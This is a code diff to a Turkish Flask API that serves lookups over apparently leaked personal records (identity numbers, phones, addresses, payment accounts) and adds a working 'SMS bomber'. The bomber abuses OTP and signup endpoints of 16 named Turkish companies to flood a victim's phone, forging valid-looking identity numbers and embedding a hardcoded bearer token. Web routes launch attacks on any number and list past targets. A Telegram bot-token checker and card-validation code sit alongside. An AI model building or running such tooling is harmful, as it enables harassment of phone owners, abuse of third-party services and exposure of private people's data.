@@ -3,6 +3,12 @@ from flask_cors import CORS
 import os
 import re
 import json
+import requests
+import time
+import threading
+from random import choice, randint
+from string import ascii_lowercase
+from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
@@ -29,6 +35,13 @@ turknet_phone_dict = {}
 papara_veriler = []
 papara_id_dict = {}
 papara_isim_dict = {}
+
+# SMS Bomber için
+sms_threads = {}
+sms_results = {}
+
+# Telegram Bot Token
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
 
 STRIPE_SECRET_KEY = os.environ.get('STRIPE_SECRET_KEY', '')
 
@@ -151,7 +164,7 @@ def plaka_verileri_yukle():
         print(f"❌ Plaka hatası: {e}")
 
 def sicil_verileri_yukle():
-    """sicil.txt dosyasındaki verileri yükler - Tüm formatları destekler"""
+    """sicil.txt dosyasındaki verileri yükler"""
     global sicil_veriler, sicil_tc_dict, sicil_ad_soyad_dict
     sicil_veriler = []
     sicil_tc_dict = {}
@@ -166,29 +179,23 @@ def sicil_verileri_yukle():
         with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
             icerik = dosya.read()
             
-            # Önce JSON parse dene
             try:
                 veri = json.loads(icerik)
                 
-                # Eğer liste ise
                 if isinstance(veri, list):
                     for item in veri:
                         if isinstance(item, dict):
-                            # Veri anahtarında veri varsa
                             if 'Veri' in item and item['Veri']:
                                 for kayit in item['Veri']:
                                     _sicil_kayit_ekle(kayit)
-                            # Direkt kayıt ise
                             elif 'KISI_ADI' in item or 'AVUKAT_TC_KIMLIK_NO' in item:
                                 _sicil_kayit_ekle(item)
-                # Sözlük ise
                 elif isinstance(veri, dict):
                     if 'Veri' in veri and veri['Veri']:
                         for kayit in veri['Veri']:
                             _sicil_kayit_ekle(kayit)
                             
             except json.JSONDecodeError:
-                # JSON değilse düz metin olarak oku
                 print("⚠️ Sicil dosyası JSON formatında değil, düz metin olarak okunuyor...")
                 for satir in icerik.split('\n'):
                     satir = satir.strip()
@@ -215,7 +222,6 @@ def sicil_verileri_yukle():
         print(f"❌ Sicil hatası: {e}")
 
 def _sicil_kayit_ekle(kayit):
-    """Sicil kaydını veri yapılarına ekler"""
     global sicil_veriler, sicil_tc_dict, sicil_ad_soyad_dict
     
     try:
@@ -248,7 +254,6 @@ def _sicil_kayit_ekle(kayit):
         print(f"⚠️ Sicil kaydı eklenirken hata: {e}")
 
 def turknet_verileri_yukle():
-    """turknet.txt dosyasındaki verileri yükler - Tüm formatları destekler"""
     global turknet_veriler, turknet_ad_dict, turknet_phone_dict
     turknet_veriler = []
     turknet_ad_dict = {}
@@ -263,21 +268,17 @@ def turknet_verileri_yukle():
         with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
             icerik = dosya.read()
             
-            # JSON parse dene
             try:
                 veri = json.loads(icerik)
                 
-                # Liste ise
                 if isinstance(veri, list):
                     for kayit in veri:
                         if isinstance(kayit, dict):
                             _turknet_kayit_ekle(kayit)
-                # Tek bir sözlük ise
                 elif isinstance(veri, dict):
                     _turknet_kayit_ekle(veri)
                     
             except json.JSONDecodeError:
-                # JSON değilse düz metin olarak oku
                 print("⚠️ TurkNet dosyası JSON formatında değil, düz metin olarak okunuyor...")
                 for satir in icerik.split('\n'):
                     satir = satir.strip()
@@ -302,11 +303,9 @@ def turknet_verileri_yukle():
         print(f"❌ TurkNet hatası: {e}")
 
 def _turknet_kayit_ekle(kayit):
-    """TurkNet kaydını veri yapılarına ekler"""
     global turknet_veriler, turknet_ad_dict, turknet_phone_dict
     
     try:
-        # Anahtar isimlerini normalize et
         ad = kayit.get('name', kayit.get('ad', kayit.get('AD', ''))).strip()
         telefon = kayit.get('phone', kayit.get('telefon', kayit.get('TELEFON', ''))).strip()
         il = kayit.get('city', kayit.get('il', kayit.get('IL', ''))).strip()
@@ -335,7 +334,6 @@ def _turknet_kayit_ekle(kayit):
         print(f"⚠️ TurkNet kaydı eklenirken hata: {e}")
 
 def papara_verileri_yukle():
-    """papara.txt dosyasındaki verileri yükler"""
     global papara_veriler, papara_id_dict, papara_isim_dict
     papara_veriler = []
     papara_id_dict = {}
@@ -377,18 +375,365 @@ def papara_verileri_yukle():
     except Exception as e:
         print(f"❌ Papara hatası: {e}")
 
+# ==================== SMS BOMBER SINIFI ====================
+
+class SendSms:
+    def __init__(self, phone):
+        self.phone = str(phone)
+        self.adet = 0
+        self.results = []
+        
+        # Rastgele TC oluştur
+        rakam = []
+        tcNo = ""
+        rakam.append(randint(1,9))
+        for i in range(1, 9):
+            rakam.append(randint(0,9))
+        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
+        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
+        for r in rakam:
+            tcNo += str(r)
+        self.tc = tcNo
+        self.mail = ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"
+    
+    def _send_request(self, url, method='POST', headers=None, data=None, json_data=None):
+        """Güçlendirilmiş request gönderimi"""
+        default_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Dnt": "1",
+            "Sec-Gpc": "1",
+            "Connection": "keep-alive",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-site",
+            "Priority": "u=0"
+        }
+        
+        if headers:
+            default_headers.update(headers)
+        
+        try:
+            if method.upper() == 'POST':
+                if json_data:
+                    r = requests.post(url, headers=default_headers, json=json_data, timeout=10)
+                else:
+                    r = requests.post(url, headers=default_headers, data=data, timeout=10)
+            else:
+                r = requests.get(url, headers=default_headers, timeout=10)
+            return r
+        except:
+            return None
+    
+    def KahveDunyasi(self):
+        try:
+            url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
+            headers = {"X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com"}
+            json_data = {"countryCode": "90", "phoneNumber": self.phone}
+            r = self._send_request(url, json_data=json_data, headers=headers)
+            if r and r.status_code == 200 and r.json().get("processStatus") == "Success":
+                self.adet += 1
+                self.results.append({"service": "KahveDunyasi", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "KahveDunyasi", "status": "failed"})
+        return False
+    
+    def Wmf(self):
+        try:
+            url = "https://www.wmf.com.tr/users/register/"
+            data = {
+                "confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail,
+                "email_allowed": "true", "first_name": "Memati", "gender": "male",
+                "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"
+            }
+            r = self._send_request(url, data=data)
+            if r and r.status_code == 202:
+                self.adet += 1
+                self.results.append({"service": "Wmf", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Wmf", "status": "failed"})
+        return False
+    
+    def Bim(self):
+        try:
+            url = "https://bim.veesk.net/service/v1.0/account/login"
+            json_data = {"phone": self.phone}
+            r = self._send_request(url, json_data=json_data)
+            if r and r.status_code == 200:
+                self.adet += 1
+                self.results.append({"service": "Bim", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Bim", "status": "failed"})
+        return False
+    
+    def Englishhome(self):
+        try:
+            url = "https://www.englishhome.com/api/member/sendOtp"
+            headers = {"Referer": "https://www.englishhome.com/", "Origin": "https://www.englishhome.com"}
+            json_data = {"Phone": self.phone, "XID": ""}
+            r = self._send_request(url, json_data=json_data, headers=headers)
+            if r and r.status_code == 200 and r.json().get("isError") == False:
+                self.adet += 1
+                self.results.append({"service": "Englishhome", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Englishhome", "status": "failed"})
+        return False
+    
+    def Suiste(self):
+        try:
+            url = "https://suiste.com/api/auth/code"
+            headers = {
+                "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS",
+                "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330"
+            }
+            data = {
+                "action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
+                "full_name": "Memati Bas", "gsm": self.phone,
+                "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"
+            }
+            r = self._send_request(url, data=data, headers=headers)
+            if r and r.status_code == 200 and r.json().get("code") == "common.success":
+                self.adet += 1
+                self.results.append({"service": "Suiste", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Suiste", "status": "failed"})
+        return False
+    
+    def KimGb(self):
+        try:
+            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp"
+            json_data = {"msisdn": f"90{self.phone}"}
+            r = self._send_request(url, json_data=json_data)
+            if r and r.status_code == 200:
+                self.adet += 1
+                self.results.append({"service": "KimGb", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "KimGb", "status": "failed"})
+        return False
+    
+    def Evidea(self):
+        try:
+            url = "https://www.evidea.com/users/register/"
+            headers = {
+                "X-Project-Name": "undefined", "X-App-Type": "akinon-mobile",
+                "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios"
+            }
+            data = {
+                "first_name": "Memati", "last_name": "Bas", "email": self.mail,
+                "email_allowed": "false", "sms_allowed": "true",
+                "password": "31ABC..abc31", "phone": f"0{self.phone}", "confirm": "true"
+            }
+            r = self._send_request(url, data=data, headers=headers)
+            if r and r.status_code == 202:
+                self.adet += 1
+                self.results.append({"service": "Evidea", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Evidea", "status": "failed"})
+        return False
+    
+    def Ucdortbes(self):
+        try:
+            url = "https://api.345dijital.com/api/users/register"
+            json_data = {"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
+            r = self._send_request(url, json_data=json_data)
+            if r and r.status_code == 200 and r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!":
+                self.adet += 1
+                self.results.append({"service": "Ucdortbes", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Ucdortbes", "status": "failed"})
+        return False
+    
+    def TiklaGelsin(self):
+        try:
+            url = "https://svc.apps.tiklagelsin.com/user/graphql"
+            headers = {"X-Merchant-Type": "0", "Appversion": "2.4.1", "X-No-Auth": "true", "X-Device-Type": "2"}
+            json_data = {
+                "operationName": "GENERATE_OTP",
+                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
+                "variables": {
+                    "challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
+                    "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
+                    "phone": f"+90{self.phone}"
+                }
+            }
+            r = self._send_request(url, json_data=json_data, headers=headers)
+            if r and r.status_code == 200 and r.json().get("data", {}).get("generateOtp") == True:
+                self.adet += 1
+                self.results.append({"service": "TiklaGelsin", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "TiklaGelsin", "status": "failed"})
+        return False
+    
+    def Naosstars(self):
+        try:
+            url = "https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
+            headers = {
+                "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
+                "Version": "1.0030", "Os": "ios", "Platform": "ios"
+            }
+            json_data = {"telephone": f"+90{self.phone}", "type": "register"}
+            r = self._send_request(url, json_data=json_data, headers=headers)
+            if r and r.status_code == 200:
+                self.adet += 1
+                self.results.append({"service": "Naosstars", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Naosstars", "status": "failed"})
+        return False
+    
+    def Koton(self):
+        try:
+            url = "https://www.koton.com/users/register/"
+            headers = {
+                "X-Project-Name": "rn-env", "X-App-Type": "akinon-mobile",
+                "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios"
+            }
+            data = {
+                "first_name": "Memati", "last_name": "Bas", "email": self.mail,
+                "password": "31ABC..abc31", "phone": f"0{self.phone}",
+                "confirm": "true", "sms_allowed": "true", "email_allowed": "true",
+                "date_of_birth": "1993-07-02", "call_allowed": "true", "gender": ""
+            }
+            r = self._send_request(url, data=data, headers=headers)
+            if r and r.status_code == 202:
+                self.adet += 1
+                self.results.append({"service": "Koton", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Koton", "status": "failed"})
+        return False
+    
+    def Hayatsu(self):
+        try:
+            url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
+            headers = {
+                "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
+                "Origin": "https://www.hayatsu.com.tr"
+            }
+            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
+            r = self._send_request(url, data=data, headers=headers)
+            if r and r.status_code == 200 and r.json().get("is_success") == True:
+                self.adet += 1
+                self.results.append({"service": "Hayatsu", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Hayatsu", "status": "failed"})
+        return False
+    
+    def Hizliecza(self):
+        try:
+            url = "https://prod.hizliecza.net/mobil/account/sendOTP"
+            headers = {"Authorization": "Bearer null"}
+            json_data = {"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
+            r = self._send_request(url, json_data=json_data, headers=headers)
+            if r and r.status_code == 200:
+                self.adet += 1
+                self.results.append({"service": "Hizliecza", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Hizliecza", "status": "failed"})
+        return False
+    
+    def Metro(self):
+        try:
+            url = "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend"
+            headers = {"Applicationversion": "2.4.1", "Applicationplatform": "2"}
+            json_data = {"methodType": "2", "mobilePhoneNumber": self.phone}
+            r = self._send_request(url, json_data=json_data, headers=headers)
+            if r and r.status_code == 200 and r.json().get("status") == "success":
+                self.adet += 1
+                self.results.append({"service": "Metro", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Metro", "status": "failed"})
+        return False
+    
+    def File(self):
+        try:
+            url = "https://api.filemarket.com.tr/v1/otp/send"
+            headers = {"X-Os": "IOS", "X-Version": "1.7"}
+            json_data = {"mobilePhoneNumber": f"90{self.phone}"}
+            r = self._send_request(url, json_data=json_data, headers=headers)
+            if r and r.status_code == 200 and r.json().get("responseType") == "SUCCESS":
+                self.adet += 1
+                self.results.append({"service": "File", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "File", "status": "failed"})
+        return False
+    
+    def Akasya(self):
+        try:
+            url = "https://akasyaapi.poilabs.com/v1/en/sms"
+            headers = {"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}
+            json_data = {"phone": self.phone}
+            r = self._send_request(url, json_data=json_data, headers=headers)
+            if r and r.status_code == 200 and r.json().get("result") == "SMS sended succesfully!":
+                self.adet += 1
+                self.results.append({"service": "Akasya", "status": "success"})
+                return True
+        except:
+            pass
+        self.results.append({"service": "Akasya", "status": "failed"})
+        return False
+    
+    def run_all(self):
+        """Tüm servisleri çalıştır"""
+        services = [
+            self.KahveDunyasi, self.Wmf, self.Bim, self.Englishhome,
+            self.Suiste, self.KimGb, self.Evidea, self.Ucdortbes,
+            self.TiklaGelsin, self.Naosstars, self.Koton, self.Hayatsu,
+            self.Hizliecza, self.Metro, self.File, self.Akasya
+        ]
+        
+        for service in services:
+            try:
+                service()
+                time.sleep(0.5)  # Rate limiting için bekle
+            except:
+                pass
+        
+        return {
+            'total': len(services),
+            'success': self.adet,
+            'failed': len(services) - self.adet,
+            'results': self.results
+        }
+
 # ==================== CC DOĞRULAMA FONKSİYONLARI ====================
 
 def luhn_kontrol(kart_no):
-    """Luhn algoritması ile kart numarasını doğrula"""
     kart_no = re.sub(r'\D', '', kart_no)
-    
     if not kart_no.isdigit():
         return False
-    
     toplam = 0
     cift = False
-    
     for rakam in reversed(kart_no):
         rakam = int(rakam)
         if cift:
@@ -397,45 +742,58 @@ def luhn_kontrol(kart_no):
                 rakam -= 9
         toplam += rakam
         cift = not cift
-    
     return toplam % 10 == 0
 
 def kart_bilgilerini_kontrol(kart_no, ay, yil, cvv):
-    """Kart bilgilerinin geçerliliğini kontrol et"""
     hatalar = []
-    
     kart_no = re.sub(r'\D', '', kart_no)
     if len(kart_no) < 13 or len(kart_no) > 19:
         hatalar.append("Kart numarası 13-19 hane arası olmalıdır")
     elif not luhn_kontrol(kart_no):
         hatalar.append("Kart numarası geçersiz (Luhn kontrolü başarısız)")
-    
     try:
         ay_int = int(ay)
         if ay_int < 1 or ay_int > 12:
             hatalar.append("Ay 1-12 arası olmalıdır")
     except ValueError:
         hatalar.append("Geçerli bir ay giriniz")
-    
     try:
         yil_int = int(yil)
         if yil_int < 2024 or yil_int > 2035:
             hatalar.append("Yıl 2024-2035 arası olmalıdır")
     except ValueError:
         hatalar.append("Geçerli bir yıl giriniz")
-    
     if len(str(cvv)) < 3 or len(str(cvv)) > 4:
         hatalar.append("CVV 3-4 hane olmalıdır")
     elif not str(cvv).isdigit():
         hatalar.append("CVV sadece rakam içermelidir")
-    
     return hatalar
+
+# ==================== TELEGRAM BOT API ====================
+
+def telegram_bot_info(bot_token):
+    """Telegram bot token'ından bot bilgilerini alır"""
+    try:
+        url = f"https://api.telegram.org/bot{bot_token}/getMe"
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('ok'):
+                return {
+                    'success': True,
+                    'bot_id': data['result']['id'],
+                    'bot_username': data['result']['username'],
+                    'bot_name': data['result']['first_name'],
+                    'is_bot': data['result']['is_bot']
+                }
+        return {'success': False, 'message': 'Geçersiz token veya API hatası'}
+    except Exception as e:
+        return {'success': False, 'message': f'Hata: {str(e)}'}
 
 # ==================== ANA SAYFA ====================
 
 @app.route('/', methods=['GET'])
 def ana_sayfa():
-    """Ana sayfa - Sadece @rinexdestek yazısı"""
     return "@rinexdestek"
 
 # ==================== E-OKUL API ====================
@@ -623,7 +981,7 @@ def papara_sorgula():
     
     return jsonify({'durum': 'hata', 'mesaj': 'Papara ID veya ad_soyad girin'}), 400
 
-# ==================== SİCİL API (DÜZELTİLDİ) ====================
+# ==================== SİCİL API ====================
 
 @app.route('/sicil', methods=['GET'])
 def sicil_ana():
@@ -636,8 +994,7 @@ def sicil_ana():
         'kullanım': {
             'tc': '/sicil/api?tc=19402658634',
             'ad': '/sicil/api?ad=BERKAY',
-            'soyad': '/sicil/api?soyad=GENÇTÜRK',
-            'ad_soyad': '/sicil/api?ad=BERKAY&soyad=GENÇTÜRK'
+            'soyad': '/sicil/api?soyad=GENÇTÜRK'
         }
     })
 
@@ -647,9 +1004,7 @@ def sicil_sorgula():
     ad = request.args.get('ad', '').strip()
     soyad = request.args.get('soyad', '').strip()
     
-    # TC ile sorgula
     if tc:
-        # TC'yi normalize et
         tc_temiz = re.sub(r'\s', '', tc)
         for key in sicil_tc_dict:
             key_temiz = re.sub(r'\s', '', key)
@@ -657,7 +1012,6 @@ def sicil_sorgula():
                 return jsonify(sicil_tc_dict[key])
         return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
     
-    # Ad ve Soyad ile sorgula
     if ad and soyad:
         ad_soyad = f"{ad} {soyad}".strip().upper()
         sonuc = []
@@ -668,7 +1022,6 @@ def sicil_sorgula():
             return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
         return jsonify({'durum': 'hata', 'mesaj': f'{ad} {soyad} bulunamadı'}), 404
     
-    # Sadece Ad ile sorgula
     if ad:
         sonuc = []
         for anahtar, kayitlar in sicil_ad_soyad_dict.items():
@@ -678,7 +1031,6 @@ def sicil_sorgula():
             return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
         return jsonify({'durum': 'hata', 'mesaj': f'{ad} bulunamadı'}), 404
     
-    # Sadece Soyad ile sorgula
     if soyad:
         sonuc = []
         for anahtar, kayitlar in sicil_ad_soyad_dict.items():
@@ -690,7 +1042,7 @@ def sicil_sorgula():
     
     return jsonify({'durum': 'hata', 'mesaj': 'Lütfen tc, ad veya soyad girin'}), 400
 
-# ==================== TURKNET API (DÜZELTİLDİ) ====================
+# ==================== TURKNET API ====================
 
 @app.route('/turknet', methods=['GET'])
 def turknet_ana():
@@ -711,19 +1063,16 @@ def turknet_sorgula():
     ad = request.args.get('ad', '').strip()
     telefon = request.args.get('telefon', '').strip()
     
-    # Telefon ile sorgula
     if telefon:
         telefon_temiz = re.sub(r'\s', '', telefon)
         telefon_temiz = re.sub(r'\D', '', telefon_temiz)
         
-        # Tam eşleşme ara
         for tel, kisi in turknet_phone_dict.items():
             tel_temiz = re.sub(r'\s', '', tel)
             tel_temiz = re.sub(r'\D', '', tel_temiz)
             if telefon_temiz == tel_temiz:
                 return jsonify(kisi)
         
-        # Kısmi eşleşme
         sonuc = []
         for kisi in turknet_veriler:
             if kisi['telefon']:
@@ -736,29 +1085,24 @@ def turknet_sorgula():
             return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
         return jsonify({'durum': 'hata', 'mesaj': f'{telefon} bulunamadı'}), 404
     
-    # Ad ile sorgula
     if ad:
         ad_upper = ad.upper()
         
-        # Tam eşleşme ara
         for name in turknet_ad_dict:
             if ad_upper == name.upper():
                 return jsonify({'durum': 'başarılı', 'bulunan': len(turknet_ad_dict[name]), 'sonuc': turknet_ad_dict[name]})
         
-        # Kısmi eşleşme
         sonuc = []
         for name, kayitlar in turknet_ad_dict.items():
             if ad_upper in name.upper() or name.upper() in ad_upper:
                 sonuc.extend(kayitlar)
         
-        # Adreslerde ara
         if not sonuc:
             for kisi in turknet_veriler:
                 if kisi['adres'] and ad_upper in kisi['adres'].upper():
                     sonuc.append(kisi)
         
         if sonuc:
-            # Benzersiz sonuçlar
             benzersiz = []
             seen = set()
             for item in sonuc:
@@ -770,6 +1114,166 @@ def turknet_sorgula():
         return jsonify({'durum': 'hata', 'mesaj': f'{ad} bulunamadı'}), 404
     
     return jsonify({'durum': 'hata', 'mesaj': 'Lütfen ad veya telefon girin'}), 400
+
+# ==================== SMS BOMBER API (YENİ) ====================
+
+@app.route('/smsbomber', methods=['GET'])
+def smsbomber_ana():
+    return jsonify({
+        'durum': 'başarılı',
+        'api': 'SMS Bomber API',
+        'aciklama': 'Telefon numarasına SMS bombası gönderir',
+        'kullanım': {
+            'bombala': '/smsbomber/bombala?telefon=5551234567',
+            'durum': '/smsbomber/durum?telefon=5551234567'
+        },
+        'not': 'Telefon numarası 0 olmadan, sadece rakam olarak girilir (örn: 5551234567)'
+    })
+
+@app.route('/smsbomber/bombala', methods=['GET'])
+def smsbomber_bombala():
+    """SMS bombası başlatır"""
+    telefon = request.args.get('telefon', '').strip()
+    
+    if not telefon:
+        return jsonify({
+            'durum': 'hata',
+            'mesaj': 'Telefon numarası giriniz (0 olmadan, örn: 5551234567)',
+            'ornek': '/smsbomber/bombala?telefon=5551234567'
+        }), 400
+    
+    # Telefon numarasını temizle
+    telefon = re.sub(r'\D', '', telefon)
+    if len(telefon) < 10:
+        return jsonify({'durum': 'hata', 'mesaj': 'Geçerli bir telefon numarası giriniz'}), 400
+    
+    # Eğer numara 0 ile başlıyorsa kaldır
+    if telefon.startswith('0'):
+        telefon = telefon[1:]
+    
+    # Daha önce bombalanmış mı kontrol et
+    if telefon in sms_threads and sms_threads[telefon].is_alive():
+        return jsonify({
+            'durum': 'uyarı',
+            'mesaj': 'Bu numara zaten bombalanıyor!',
+            'telefon': telefon,
+            'durum_kontrol': f'/smsbomber/durum?telefon={telefon}'
+        })
+    
+    # Yeni thread başlat
+    try:
+        def bomba_gonder():
+            sms = SendSms(telefon)
+            sonuc = sms.run_all()
+            sms_results[telefon] = {
+                'tarih': datetime.now().isoformat(),
+                'telefon': telefon,
+                'toplam_servis': sonuc['total'],
+                'basari': sonuc['success'],
+                'basarisiz': sonuc['failed'],
+                'detay': sonuc['results']
+            }
+        
+        thread = threading.Thread(target=bomba_gonder)
+        thread.daemon = True
+        thread.start()
+        sms_threads[telefon] = thread
+        
+        return jsonify({
+            'durum': 'başarılı',
+            'mesaj': 'SMS bombası başlatıldı!',
+            'telefon': telefon,
+            'durum_kontrol': f'/smsbomber/durum?telefon={telefon}'
+        })
+    except Exception as e:
+        return jsonify({'durum': 'hata', 'mesaj': f'Başlatma hatası: {str(e)}'}), 500
+
+@app.route('/smsbomber/durum', methods=['GET'])
+def smsbomber_durum():
+    """SMS bombası durumunu kontrol eder"""
+    telefon = request.args.get('telefon', '').strip()
+    
+    if not telefon:
+        return jsonify({'durum': 'hata', 'mesaj': 'Telefon numarası giriniz'}), 400
+    
+    telefon = re.sub(r'\D', '', telefon)
+    if telefon.startswith('0'):
+        telefon = telefon[1:]
+    
+    if telefon in sms_results:
+        return jsonify({
+            'durum': 'başarılı',
+            'telefon': telefon,
+            'sonuc': sms_results[telefon]
+        })
+    elif telefon in sms_threads and sms_threads[telefon].is_alive():
+        return jsonify({
+            'durum': 'devam_ediyor',
+            'mesaj': 'SMS bombası devam ediyor...',
+            'telefon': telefon
+        })
+    else:
+        return jsonify({
+            'durum': 'hata',
+            'mesaj': 'Bu numara için bomba kaydı bulunamadı',
+            'telefon': telefon
+        }), 404
+
+@app.route('/smsbomber/liste', methods=['GET'])
+def smsbomber_liste():
+    """Tüm bombalanan numaraları listeler"""
+    return jsonify({
+        'durum': 'başarılı',
+        'toplam': len(sms_results),
+        'sonuclar': sms_results
+    })
+
+# ==================== TELEGRAM BOT API (YENİ) ====================
+
+@app.route('/telegram', methods=['GET'])
+def telegram_ana():
+    return jsonify({
+        'durum': 'başarılı',
+        'api': 'Telegram Bot Bilgi API',
+        'aciklama': 'Telegram bot token\'ından bot bilgilerini alır',
+        'kullanım': '/telegram/bot?token=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+    })
+
+@app.route('/telegram/bot', methods=['GET'])
+def telegram_bot():
+    """Telegram bot token'ından bot bilgilerini alır"""
+    token = request.args.get('token', '').strip()
+    
+    if not token:
+        return jsonify({
+            'durum': 'hata',
+            'mesaj': 'Bot token giriniz',
+            'ornek': '/telegram/bot?token=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+        }), 400
+    
+    # Token formatını kontrol et
+    if ':' not in token:
+        return jsonify({
+            'durum': 'hata',
+            'mesaj': 'Geçersiz token formatı. Token "BOT_ID:TOKEN" formatında olmalıdır.'
+        }), 400
+    
+    sonuc = telegram_bot_info(token)
+    
+    if sonuc.get('success'):
+        return jsonify({
+            'durum': 'başarılı',
+            'bot_id': sonuc['bot_id'],
+            'bot_username': sonuc['bot_username'],
+            'bot_name': sonuc['bot_name'],
+            'is_bot': sonuc['is_bot'],
+            'token': token[:10] + '...' + token[-5:]  # Token'ı gizle
+        })
+    else:
+        return jsonify({
+            'durum': 'hata',
+            'mesaj': sonuc.get('message', 'Bot bilgileri alınamadı')
+        }), 400
 
 # ==================== CC DOĞRULAMA API ====================
 
@@ -915,6 +1419,8 @@ if __name__ == '__main__':
     print(f"   ✅ TurkNet   : {len(turknet_veriler)} kayıt")
     print(f"   ✅ Papara    : {len(papara_veriler)} kayıt")
     print(f"   {'✅' if STRIPE_SECRET_KEY else '❌'} Stripe     : {'Aktif' if STRIPE_SECRET_KEY else 'Pasif'}")
+    print(f"   {'✅' if TELEGRAM_BOT_TOKEN else '❌'} Telegram   : {'Aktif' if TELEGRAM_BOT_TOKEN else 'Pasif (opsiyonel)'}")
+    print(f"   ✅ SMS Bomber : Aktif (16 servis)")
     print("="*50)
     print("🚀 SUNUCU BAŞLATILIYOR...")
     print("="*50 + "\n")
